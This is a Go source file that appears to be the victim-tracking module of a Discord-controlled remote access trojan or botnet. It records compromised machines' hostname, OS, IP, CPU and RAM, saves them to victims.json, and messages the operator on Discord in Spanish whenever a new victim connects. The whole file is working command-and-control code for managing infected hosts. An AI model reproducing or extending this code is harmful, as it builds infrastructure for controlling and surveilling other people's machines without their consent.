package utils

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

type Victim struct {
	ID       string    `json:"id"`
	Hostname string    `json:"hostname"`
	OS       string    `json:"os"`
	IP       string    `json:"ip"`
	LastSeen time.Time `json:"last_seen"`
	CPU      string    `json:"cpu"`
	RAM      string    `json:"ram"`
	IsActive bool      `json:"is_active"`
}

type VictimManager struct {
	victims map[string]*Victim
	mu      sync.RWMutex
	session *discordgo.Session
	ownerID string
}

func NewVictimManager() *VictimManager {
	return &VictimManager{
		victims: make(map[string]*Victim),
	}
}

func (vm *VictimManager) SetSession(s *discordgo.Session, ownerID string) {
	vm.session = s
	vm.ownerID = ownerID
}

func (vm *VictimManager) SaveToFile() error {
	vm.mu.RLock()
	defer vm.mu.RUnlock()

	data, err := json.Marshal(vm.victims)
	if err != nil {
		return err
	}

	return os.WriteFile("victims.json", data, 0644)
}

func (vm *VictimManager) LoadFromFile() error {
	data, err := os.ReadFile("victims.json")
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}

	vm.mu.Lock()
	defer vm.mu.Unlock()

	return json.Unmarshal(data, &vm.victims)
}

func (vm *VictimManager) GetActiveVictims() []*Victim {
	vm.mu.RLock()
	defer vm.mu.RUnlock()

	active := make([]*Victim, 0)
	for _, v := range vm.victims {
		if v.IsActive {
			active = append(active, v)
		}
	}
	return active
}

func (vm *VictimManager) UpdateVictim(id string, v *Victim) {
	if id == "" || v == nil {
		return
	}
	vm.mu.Lock()
	defer vm.mu.Unlock()

	isNew := false
	if _, exists := vm.victims[id]; !exists {
		isNew = true
	}

	vm.victims[id] = v

	if isNew && vm.session != nil {
		message := fmt.Sprintf(
			"🚨 Nuevo cliente conectado!\nHostname: %s\nOS: %s\nIP: %s\nÚltimo acceso: %s",
			v.Hostname, v.OS, v.IP, v.LastSeen.Format("02-01-2006 15:04:05"),
		)
		if _, err := vm.session.ChannelMessageSend(vm.ownerID, message); err != nil {
			log.Printf("❌ Error notificando al owner: %v", err)
		}
	}
}
